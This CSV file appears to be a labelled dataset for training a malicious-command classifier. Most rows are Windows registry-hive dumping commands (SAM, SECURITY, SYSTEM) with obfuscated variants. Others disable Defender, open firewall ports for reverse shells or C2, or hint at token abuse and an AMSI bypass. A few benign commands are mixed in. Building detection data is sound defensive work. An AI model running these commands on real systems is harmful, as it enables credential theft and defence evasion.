text,label
"powershell -nop -c ""reg save hklm\sam c:\temp\n8tj0drf.dat""",1
reg save hklm\security c:\windows\temp\gwlak3m5.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\izhytfuh.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\sam c:\temp\q6uht6fa.dat""""",1
reg save hklm\security c:\windows\temp\6qeahzcm.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\k8o5st49.dat""",1
reg export hklm\system c:\windows\temp\hiqxwyxi.save,1
reg export hklm\system c:\windows\temp\ko5vuv6f.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\rbx9q6m1.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\gxm5ifa7.save""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\4sjlwe9g.dat""""",1
reg save hklm\sam c:\windows\temp\6157fr4v.save,1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\lwokjjds.dat""",1
reg export hklm\system c:\windows\temp\ctyfi7pf.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\37j7r1eq.dat""",1
reg save hklm\security c:\windows\temp\qxx46tjd.save,1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\5ozia13j.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\4gmp7sre.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\8c09ruew.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\1osv9v08.dat""",1
reg save hklm\security c:\windows\temp\m2lc8p1a.save,1
reg export hklm\system c:\windows\temp\tm9498ov.save,1
reg export hklm\security c:\windows\temp\bmldbm9o.save,1
"cmd.exe /c ""set-mppreference   -disablerealtimemonitoring   $true""",2
reg   export   hklm\sam   c:\windows\temp\cg1derw4.save,1
reg export hklm\security c:\windows\temp\r9lrupyd.save,1
reg save hklm\sam c:\windows\temp\bv0enou5.save,1
reg save hklm\security c:\windows\temp\n5m39nnz.save,1
reg save hklm\sam c:\windows\temp\xvioll8d.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\y5bhprp2.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\g1hpvi97.dat""",1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\1is4dfx0.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\xgzwo1tn.dat""",1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\i6nsubpb.save""",1
reg save hklm\system c:\windows\temp\ez3pcxil.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")] extern bool openprocesstoken(...)""",3
"powershell -nop -c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: 4444""",2
"cmd.exe /c ""reg save hklm\security c:\temp\j72pmg1a.dat""",1
reg save hklm\system c:\windows\temp\qoipao2g.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\7mkb8l8n.dat""",1
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\c0ex8c2f.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\y01053pb.dat""",1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\vi87hll8.save""",1
reg save hklm\security c:\windows\temp\w1coqcci.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\66lmdje7.dat""",1
"cmd.exe /c ""backup-utility save registry config""",0
"cmd.exe /c ""reg export hklm\sam c:\temp\sitvty4d.dat""",1
reg export hklm\security c:\windows\temp\2lzuihgx.save,1
reg export hklm\sam c:\windows\temp\6p2ksifl.save,1
reg export hklm\security c:\windows\temp\d3y0sqze.save,1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\k4pra9ma.save""",1
reg export hklm\system c:\windows\temp\9792escc.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\cv64mxcq.dat""",1
reg export hklm\sam c:\windows\temp\wagvb96p.save,1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\gitrp2hg.dat""""",1
reg export hklm\security c:\windows\temp\ukld75bg.save,1
reg save hklm\system c:\windows\temp\g7a8y0as.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\12ptlvxh.dat""",1
reg export hklm\sam c:\windows\temp\p7h7a78v.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\slicvj52.dat""",1
reg export hklm\security c:\windows\temp\rz1l486x.save,1
reg   save   hklm\sam   c:\windows\temp\e41s6j0r.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\r6yqwxvg.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\2enx0stx.dat""",1
reg export hklm\sam c:\windows\temp\4locx36k.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\chsav667.dat""",1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]  extern  bool  duplicatetokenex(...)""",3
"cmd.exe /c ""reg save hklm\security c:\temp\849e90ot.dat""",1
reg export hklm\sam c:\windows\temp\c4f33l5s.save,1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\security c:\temp\01v1zust.dat""""",1
reg save hklm\sam c:\windows\temp\568fu2mn.save,1
reg export hklm\sam c:\windows\temp\4eopj6kx.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\2dloo3xv.dat""",1
reg   export   hklm\system   c:\windows\temp\tnvqrh67.save,1
"powershell -nop -c ""$a = [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
"powershell -nop -c ""reg export hklm\sam c:\temp\5e4liyjs.dat""",1
reg export hklm\security c:\windows\temp\lm1lfdqs.save,1
reg save hklm\security c:\windows\temp\3xlgh4l2.save,1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\security c:\temp\zt3919hj.dat""""",1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\hazwf202.dat""",1
reg export hklm\sam c:\windows\temp\gbcdtj4v.save,1
reg save hklm\sam c:\windows\temp\7k1brxhk.save,1
reg export hklm\security c:\windows\temp\wgevxqad.save,1
reg   save   hklm\system   c:\windows\temp\k0d4ljr3.save,1
reg  save  hklm\system  c:\windows\temp\677a6a4j.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\t87z3auw.save""",1
reg save hklm\sam c:\windows\temp\5f9ihzp2.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\k6hedl25.dat""",1
reg save hklm\system c:\windows\temp\50kxvgbh.save,1
reg save hklm\security c:\windows\temp\xic020g1.save,1
reg save hklm\security c:\windows\temp\nk2obf4t.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\mma9fy03.dat""",1
reg save hklm\system c:\windows\temp\vv3iokh9.save,1
reg export hklm\security c:\windows\temp\fdf4ykaj.save,1
reg save hklm\system c:\windows\temp\5caf0fgp.save,1
reg   export   hklm\security   c:\windows\temp\ugild11l.save,1
reg export hklm\security c:\windows\temp\7kw7j05z.save,1
reg export hklm\system c:\windows\temp\s5hcttl2.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\753goz18.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\meu9r90i.dat""",1
"powershell -nop -c ""rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\yjc7pjq5.dat""",1
reg export hklm\system c:\windows\temp\mbqlm9m3.save,1
rule: exfil data | app: any | dir: outbound | act: allow | port: tcp 8888,2
"powershell -nop -c ""reg save hklm\security c:\temp\cc996rvq.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\km780g5z.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\1jmtzexm.dat""",1
reg export hklm\sam c:\windows\temp\kw6zf6t7.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ysz62fo1.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\u0y2b0ly.dat""",1
reg export hklm\security c:\windows\temp\ixggdn7c.save,1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\rvrz637t.save""",1
reg export hklm\system c:\windows\temp\e31v0fvw.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\4se262t9.dat""",1
reg export hklm\sam c:\windows\temp\w0a88waf.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\wjsj5on1.dat""",1
reg export hklm\sam c:\windows\temp\2vnvou6h.save,1
reg save hklm\sam c:\windows\temp\oh04rfs9.save,1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\pazvmiyl.save""",1
reg   export   hklm\system   c:\windows\temp\xwsi32dg.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\78w7r8f1.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\r8b987p2.dat""",1
reg save hklm\security c:\windows\temp\brud5iv4.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\dhyynmq0.dat""",1
reg export hklm\security c:\windows\temp\ws7ai1c7.save,1
"powershell -nop -c ""get-help  adjusttokenprivileges  -full""",0
reg export hklm\system c:\windows\temp\xcaxofth.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\xws220cc.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\sof1xen3.dat""",1
"cmd.exe /c ""klist  purge""",3
reg save hklm\security c:\windows\temp\zg7gwggd.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\qqz956sc.dat""",1
reg export hklm\security c:\windows\temp\lz5vlp46.save,1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\0iirhq03.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\jr4e9wko.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\sam c:\temp\l4mxaclk.dat""""",1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"powershell -nop -c ""reg save hklm\security c:\temp\m96wjy0p.dat""",1
reg save hklm\system c:\windows\temp\6ufa3yx1.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\pfh977rc.dat""",1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]  extern  bool  amsiutils(...)""",3
"powershell -nop -c ""get-help   adjusttokenprivileges   -full""",0
"powershell -nop -c ""reg save hklm\sam c:\temp\6cb0amn4.dat""",1
reg save hklm\system c:\windows\temp\sm15w8j8.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\uak4l5rl.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\3ellegqy.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\cs1w4shv.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\m2qiukqo.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\84y9q3d7.dat""",1
reg export hklm\security c:\windows\temp\i49qhpcd.save,1
reg save hklm\system c:\windows\temp\ommjujcv.save,1
reg save hklm\sam c:\windows\temp\ypg5tnjh.save,1
reg export hklm\security c:\windows\temp\3ixh4ok3.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\661ii686.dat""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\ckomi7de.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\93d9x2ow.dat""",1
"powershell -nop -c ""reg  query  hkcu\console""",0
"cmd.exe /c ""reg save hklm\security c:\temp\klwmfjdg.dat""",1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\8e98b1et.dat""",1
reg save hklm\security c:\windows\temp\1movwhde.save,1
"cmd.exe /c ""java  -jar  application.jar""",0
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\z9i3ay40.dat""",1
reg save hklm\system c:\windows\temp\12pv7l29.save,1
reg save hklm\system c:\windows\temp\rvqn5tvw.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\4qqreuwi.dat""",1
reg export hklm\security c:\windows\temp\o0ng72cl.save,1
reg save hklm\system c:\windows\temp\x9j6dowf.save,1
reg save hklm\sam c:\windows\temp\g0n8dd95.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\yy3mulsu.dat""",1
reg  save  hklm\sam  c:\windows\temp\qnlq8asa.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\i8evf2jc.dat""",1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\1m9tzgi0.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\86kjoj75.dat""",1
reg save hklm\system c:\windows\temp\vksccsxg.save,1
reg save hklm\sam c:\windows\temp\0fkymk0f.save,1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\cmpmjcz6.dat""""",1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\ku8jtfto.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\ioxctbvx.dat""",1
reg export hklm\system c:\windows\temp\nmf89blb.save,1
reg save hklm\sam c:\windows\temp\09wqo5n0.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\reo6ypbd.dat""",1
reg save hklm\system c:\windows\temp\bv0h0yp2.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\3ii6b6vf.dat""",1
reg export hklm\security c:\windows\temp\fwdu896s.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\w4wftaq3.dat""",1
reg export hklm\sam c:\windows\temp\pq87xbh8.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\zwsku3gu.dat""",1
reg save hklm\sam c:\windows\temp\iiuynpy2.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\30m3fmmu.save""",1
reg save hklm\system c:\windows\temp\ic5o8nur.save,1
reg save hklm\security c:\windows\temp\2rte33cd.save,1
reg save hklm\system c:\windows\temp\qnvpbnk9.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\bf0oizfs.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\wgbncc5z.dat""""",1
reg export hklm\system c:\windows\temp\q81vi338.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\q10r5lxp.dat""",1
reg save hklm\system c:\windows\temp\xppeouah.save,1
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\15rqlp1f.dat""",1
reg save hklm\system c:\windows\temp\lnpn8srk.save,1
reg save hklm\system c:\windows\temp\5ng3yxal.save,1
reg save hklm\security c:\windows\temp\4t0cj3el.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\hn9kc4w2.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\0pmhpm0q.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\a1h66759.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\8qvkty48.dat""",1
reg  export  hklm\sam  c:\windows\temp\eq3bq14e.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\aawktnkb.save""",1
reg save hklm\system c:\windows\temp\jnnikyzv.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\urq45r2n.dat""",1
reg save hklm\security c:\windows\temp\hx0a7hw9.save,1
reg export hklm\security c:\windows\temp\hydy4g1l.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\uibei30e.dat""",1
"powershell -nop -c ""rule: exfil data | app: any | dir: outbound | act: allow | port: tcp 8888""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\mvtcyd0a.dat""",1
reg export hklm\system c:\windows\temp\9znsy0uc.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\5x6kx3ca.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\87aitld2.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\f9y4jjbd.dat""",1
reg save hklm\security c:\windows\temp\oac4z4vh.save,1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\vpy1a114.dat""",1
reg save hklm\system c:\windows\temp\mh2tkvyr.save,1
"[dllimport(""advapi32.dll"")]  extern  bool  openprocesstoken(...)",3
"cmd.exe /c ""reg export hklm\security c:\temp\ka0llo2k.dat""",1
reg save hklm\sam c:\windows\temp\5zp3o0ua.save,1
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.amsiutils')""",3
reg save hklm\security c:\windows\temp\biylmjaw.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\rkwkxgtf.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\nq1c993w.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\jkkn0ysj.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\e6por3lh.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\q8ddmlel.dat""",1
reg  save  hklm\security  c:\windows\temp\z06qsrpt.save,1
reg save hklm\security c:\windows\temp\5l2h1tx6.save,1
reg save hklm\security c:\windows\temp\oqwbynez.save,1
reg export hklm\system c:\windows\temp\aeqvp9ij.save,1
reg save hklm\sam c:\windows\temp\hxqvgq4b.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\4w1rxyfo.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\l45nghqp.dat""""",1
reg export hklm\sam c:\windows\temp\f09p289g.save,1
reg export hklm\sam c:\windows\temp\6q78xsjj.save,1
reg save hklm\system c:\windows\temp\i5kqzmw0.save,1
reg save hklm\sam c:\windows\temp\vjgrjhj0.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\n5rbjcmt.dat""",1
reg export hklm\sam c:\windows\temp\s5vytvig.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\keaencor.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\wgme911w.dat""",1
reg export hklm\sam c:\windows\temp\4doov9f0.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\4rh4i0y5.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\s2mkfn80.dat""",1
reg save hklm\security c:\windows\temp\txw2c9k4.save,1
reg query hkcu\console,0
"powershell -nop -c ""reg export hklm\security c:\temp\y5586mkh.dat""",1
reg save hklm\security c:\windows\temp\vsqqccw6.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\i6c9gc2c.dat""",1
set-mppreference -disablerealtimemonitoring $true,2
reg save hklm\sam c:\windows\temp\b1x007e4.save,1
rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888,2
"cmd.exe /c ""reg save hklm\sam c:\temp\3dbor5qw.dat""",1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\r669k422.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\31m06lp7.dat""",1
reg save hklm\sam c:\windows\temp\i2gmtmdr.save,1
reg export hklm\system c:\windows\temp\7vbxesfo.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\caljqbsa.dat""",1
"cmd.exe /c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
"cmd.exe /c ""cmd.exe /c ""reg save hklm\security c:\temp\fpqv1iy3.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\9vvjfres.dat""",1
"cmd.exe /c ""rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\ju2r27gc.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\windows\temp\gfoexabm.save""",1
reg save hklm\sam c:\windows\temp\d6u9t91i.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\kfa9sto4.dat""",1
reg   save   hklm\system   c:\windows\temp\cxjydzhu.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\etqxgla4.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\uiv76dt6.dat""",1
reg save hklm\sam c:\windows\temp\9sm9vd7k.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\db86yyg4.dat""",1
reg export hklm\sam c:\windows\temp\8c1x2sb8.save,1
reg save hklm\system c:\windows\temp\6svdzigg.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\zpfoze8q.dat""",1
reg save hklm\security c:\windows\temp\6nkmw033.save,1
reg save hklm\security c:\windows\temp\lvft9a98.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\w43tuv5q.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\339m2nxh.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ti9r2fny.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\g1t8e1rg.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\1p058kza.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\pn16s5j4.dat""",1
reg save hklm\security c:\windows\temp\bo7b5fek.save,1
"powershell -nop -c ""netsh advfirewall firewall add rule name=""bad"" action=allow protocol=any port=4444""",2
reg export hklm\system c:\windows\temp\p8ocjefj.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\3tsytvwv.dat""",1
reg save hklm\security c:\windows\temp\rzouvtrl.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\47ofw387.dat""",1
rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337,2
reg export hklm\system c:\windows\temp\ks5xpr3v.save,1
reg export hklm\sam c:\windows\temp\krukc6qk.save,1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\zls4zduh.dat""""",1
reg save hklm\security c:\windows\temp\ngigonlt.save,1
